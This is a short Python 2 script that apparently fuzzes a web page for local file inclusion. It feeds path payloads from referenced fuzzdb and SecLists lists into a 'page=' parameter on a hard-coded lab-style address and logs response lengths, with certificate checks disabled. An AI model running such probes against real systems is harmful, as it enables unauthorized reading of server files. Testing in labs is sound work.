import requests
import sys

#https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/lfi/JHADDIX_LFI.txt
#https://github.com/danielmiessler/SecLists/blob/49a6d721ffa86a2aee5e7406445dc758f3d91b52/Discovery/Web-Content/nginx.txt
lfi_tests_file = "lfi_tests.txt"
lfi_test_url = "https://10.10.10.10/index.php?page="

def checkLFI(lfi_path):
    print "Checking: " + lfi_path + "\t\t",
    full_url = lfi_test_url + lfi_path
    try:
        r = requests.get(full_url,verify=False)
        print "... Connected\t\t",
        if r.status_code == 404:
            print " ... 404 FILE NOT FOUND!"
            return
        print "... Length: \t\t" + str(len(r.content))
    except:
        print "Unexpected error:", sys.exc_info()[0]
        print "... FAILED to connect!"
        return

with open(lfi_tests_file,"r") as file:
    for line in file:
        checkLFI(line)
